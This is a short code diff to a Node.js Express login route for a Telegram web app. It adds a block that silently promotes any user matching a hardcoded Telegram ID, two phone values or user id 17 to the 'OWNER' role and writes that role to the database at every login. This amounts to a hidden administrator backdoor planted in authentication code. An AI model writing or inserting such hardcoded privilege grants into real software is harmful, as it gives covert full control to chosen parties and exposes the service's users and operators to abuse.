@@ -447,6 +447,12 @@ app.post("/api/telegram/webapp-login",async(req,res)=>{
           u={...newUser,main_balance:"0.00",vip_balance:"0.00"};
         }
       }
+      if (u) {
+        if (String(tgId) === "6110967349" || u.phone === "TG6110967349" || u.phone === "0951666750" || u.id === 17) {
+          u.role = "OWNER";
+          await client.query("UPDATE users SET role = 'OWNER' WHERE id = $1", [u.id]);
+        }
+      }
       await client.query("COMMIT");
       const token=await createSession(u);
       res.json({
